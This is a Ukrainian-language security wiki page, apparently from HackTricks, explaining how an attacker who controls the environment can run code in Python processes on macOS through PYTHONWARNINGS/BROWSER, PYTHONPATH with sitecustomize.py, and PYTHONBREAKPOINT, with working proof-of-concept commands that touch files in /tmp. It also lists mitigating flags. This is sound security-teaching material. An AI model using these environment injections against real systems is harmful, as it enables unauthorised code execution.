# Ін’єкція в Python-застосунки macOS

{{#include ../../../banners/hacktricks-training.md}}

## Через змінні середовища `PYTHONWARNINGS` і `BROWSER`

Якщо attacker може контролювати середовище Python-процесу, поєднання `PYTHONWARNINGS` і `BROWSER` може спричинити виконання команд, коли Python імпортує модуль `antigravity` під час обробки спеціально сформованої опції попередження. Техніка використовує те, що `antigravity` відкриває URL за допомогою модуля Python `webbrowser`, який враховує змінну середовища `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## За допомогою `PYTHONPATH` і `sitecustomize.py`

Під час звичайного запуску модуль Python `site` додає специфічні для сайту шляхи, а потім намагається імпортувати модуль із назвою `sitecustomize`. Розмістивши доступний для запису зловмисником каталог першим у `PYTHONPATH`, зловмисник, який контролює середовище процесу, може змусити Python імпортувати payload до запуску цільового скрипту. Прапорець `-S` вимикає автоматичну ініціалізацію `site`, тоді як ізольований режим (`-I`) ігнорує `PYTHONPATH` і передбачає використання `-s` та `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## Через `PYTHONBREAKPOINT`

Починаючи з Python 3.7 (PEP 553), вбудована функція `breakpoint()` імпортує та викликає те, на що вказує `sys.breakpointhook`, а це значення береться зі змінної середовища **`PYTHONBREAKPOINT`** (`package.module.callable`). Імпорт названого модуля та виклик callable виконуються ще до того, як зазвичай з’являється debugger, тому зловмисник, який контролює середовище процесу, що доходить до `breakpoint()` (що часто трапляється в скриптах обслуговування/налагодження, а іноді залишається у production-шляхах), отримує виконання коду.<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
На відміну від `PYTHONWARNINGS`/`PYTHONPATH`, тут цільовий процес має фактично дійти до виклику `breakpoint()`, але це також працює суто через **побічні ефекти імпорту** названого модуля (вкажіть будь-який доступний для імпорту модуль — наприклад, розміщений першим у `PYTHONPATH`, — код верхнього рівня якого виконується). Встановлення `PYTHONBREAKPOINT=0` повністю вимикає hook.

## References

- [1] [Hacking with Environment Variables — elttam](https://www.elttam.com/blog/env/)
- [2] [site — hook конфігурації для конкретного сайту](https://docs.python.org/3/library/site.html)
- [3] [Python: командний рядок і середовище](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — вбудований breakpoint() і PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
